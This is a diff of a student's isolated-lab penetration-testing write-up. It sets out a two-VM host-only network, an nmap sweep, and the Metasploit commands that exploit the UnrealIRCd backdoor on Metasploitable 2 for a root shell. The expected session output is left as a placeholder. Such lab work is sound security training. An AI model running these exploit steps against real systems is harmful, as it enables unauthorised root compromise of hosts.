@@ -177,20 +177,22 @@ Modern archives encrypt with AES-256, which john reports as `$zip2$`. Every gues
 
 ## The dual-adapter lab
 
-| VM | Adapter 1 | Adapter 2 |
-|---|---|---|
-| Kali (attacker) | NAT, internet access for tooling | Host-only, lab segment |
-| Metasploitable 2 (target) | disabled | Host-only, lab segment |
+| VM | Adapter 1 | Adapter 2 | Lab address |
+|---|---|---|---|
+| Kali (attacker) | NAT, internet access for tooling | Host-only | `192.168.56.103` |
+| Metasploitable 2 (target) | disabled | Host-only | `192.168.56.102` |
 
-The target therefore has no internet-facing adapter at all. Isolation confirmation: from Kali, `ping -c 2 8.8.8.8` succeeds while the target answers only on the host-only segment, and the host-only network exists purely inside my host, so no device on my real LAN can reach the target.
+The target has no internet-facing adapter at all, and the host-only network exists only inside my host, so nothing on my real LAN can reach it.
 
 ```bash
-ping -c 2 8.8.8.8             # internet: succeeds
-ip -br addr show              # both adapters listed
-ping -c 2 192.168.56.10X      # target on the host-only segment
+ip -br addr show                  # eth0 10.0.2.4 (NAT) + eth1 192.168.56.103 (host-only)
+ping -c 2 8.8.8.8                 # succeeds: internet for tooling
+nmap -sn 192.168.56.0/24          # sweep finds the target at 192.168.56.102
 ```
 
 ![S11-11: dual-adapter layout and isolation proof](Figures/s11-11-dual-adapter.png)
+
+**A lesson from this run:** my first isolation ping used the handout's example address, 192.168.56.101, where no host existed: `Destination Host Unreachable`, 100 percent loss. The sweep above had already found the real target at 192.168.56.102. Lesson recorded: take addresses from your own sweep, never from example text.
 
 ## Reproduction
 
@@ -198,16 +200,16 @@ ping -c 2 192.168.56.10X      # target on the host-only segment
 msfconsole -q
 search unrealircd
 use 0                        # exploit/unix/irc/unreal_ircd_3679_exec
-show options
-set RHOSTS 192.168.56.10X    # target host-only address
+set RHOSTS 192.168.56.102
 set RPORT 6697
 exploit
-id
 ```
 
+My first exploit attempt targeted the stale example address: nothing was listening there, no session opened, and the commands I typed fell back to my own Kali shell. I corrected the address and reran.
+
 ```text
-<<REPLACE with your Metasploit session output: module options, the exploit
-banner, "Command shell session 1 opened", and your id output showing uid=0>>
+<<REPLACE with your corrected Metasploit session output: "Command shell session 1 opened",
+then id showing uid=0(root) on Metasploitable, and whoami showing root>>
 ```
 
 The module connects to the IRC server, sends the backdoor trigger through the `AB;` prefix, and the target executes the attached command, returning a shell as `root`.
